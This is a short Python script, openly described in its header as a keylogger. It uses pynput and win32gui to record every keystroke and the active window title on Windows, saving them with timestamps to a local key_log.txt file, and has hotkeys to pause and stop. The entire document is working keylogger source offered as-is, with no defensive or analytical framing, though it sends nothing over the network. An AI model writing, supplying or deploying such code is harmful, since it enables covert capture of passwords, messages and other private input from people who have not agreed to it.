# Description of the Keylogger Code
# This Python script logs keystrokes and saves them into a key_log.txt file. 
# It uses the pynput library to listen to keyboard events and win32gui to detect the currently active window.

# 🧠 What it does:
# Records every key the user presses.
# Logs the title of the active window whenever it changes.
# hows special keys (like Enter, Space, etc.) in a readable format.
# Toggle logging on/off with Alt + F5.
# Stop the keylogger completely with Alt + F10.
# Adds timestamps to show when things happen.

from pynput import keyboard
from datetime import datetime
import os
import win32gui

log_file = os.path.join(os.path.dirname(__file__), "key_log.txt")

special_keys = {
    "Key.space": "[SPACE]", "Key.enter": "[ENTER]", "Key.backspace": "[BACKSPACE]",
    "Key.tab": "[TAB]", "Key.esc": "[ESC]", "Key.shift": "[SHIFT]",
    "Key.ctrl_l": "[CTRL]", "Key.alt_l": "[ALT]", "Key.delete": "[DELETE]",
    "Key.up": "[UP]", "Key.down": "[DOWN]", "Key.left": "[LEFT]", "Key.right": "[RIGHT]"
}

last_window = ""
logging_on = True
pressed = set()

def get_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "UnknownWindow"

def on_press(key):
    global last_window, logging_on
    pressed.add(key)

    # Toggle logging: Alt + F5
    if keyboard.Key.alt_l in pressed and key == keyboard.Key.f5:
        logging_on = not logging_on
        log_status(f"Logging {'Resumed' if logging_on else 'Paused'}")
        return

    # Stop logging: Alt + F10
    if keyboard.Key.alt_l in pressed and key == keyboard.Key.f10:
        log_status("Logging Stopped")
        return False

    if not logging_on:
        return

    current_window = get_window_title()
    if current_window != last_window:
        last_window = current_window
        log_status(f"Active Window: {current_window}")

    try:
        k = key.char
    except AttributeError:
        k = special_keys.get(str(key), f"[{str(key).replace('Key.', '').upper()}]")

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(k)

def on_release(key):
    pressed.discard(key)

def log_status(message):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"\n\n--- [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message} ---\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
